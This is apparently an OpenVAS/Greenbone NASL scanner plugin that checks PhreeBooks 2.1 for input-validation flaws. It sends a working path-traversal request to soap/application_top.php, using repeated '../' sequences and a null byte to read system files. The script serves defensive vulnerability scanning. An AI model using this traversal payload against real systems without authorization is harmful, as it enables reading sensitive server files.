if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100863" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2010-10-21 13:52:26 +0200 (Thu, 21 Oct 2010)" );
	script_bugtraq_id( 44260 );
	script_tag( name: "cvss_base", value: "2.6" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:N/I:P/A:N" );
	script_name( "PhreeBooks Multiple Remote Vulnerabilities" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/44260" );
	script_xref( name: "URL", value: "http://www.phreebooks.com/" );
	script_xref( name: "URL", value: "http://secunia.com/secunia_research/2010-122/" );
	script_xref( name: "URL", value: "http://secunia.com/secunia_research/2010-123/" );
	script_xref( name: "URL", value: "http://secunia.com/secunia_research/2010-124/" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "gb_PhreeBooks_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "phreebooks/detected" );
	script_tag( name: "summary", value: "PhreeBooks is prone to multiple input-validation vulnerabilities." );
	script_tag( name: "impact", value: "Exploiting these issues could allow an attacker to steal cookie-based
  authentication credentials, compromise the application, access or
  modify data, exploit latent vulnerabilities in the underlying
  database, or obtain potentially sensitive information and execute
  arbitrary local scripts in the context of the webserver process. This
  may allow the attacker to compromise the application and the computer,
  other attacks are also possible." );
	script_tag( name: "affected", value: "PhreeBooks 2.1 is vulnerable, other versions may also be affected." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("version_func.inc.sc");
port = http_get_port( default: 80 );
if(!dir = get_dir_from_kb( port: port, app: "PhreeBooks" )){
	exit( 0 );
}
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	url = NASLString( dir, "/soap/application_top.php?db=", crap( data: "../", length: 3 * 9 ), file, "%00" );
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

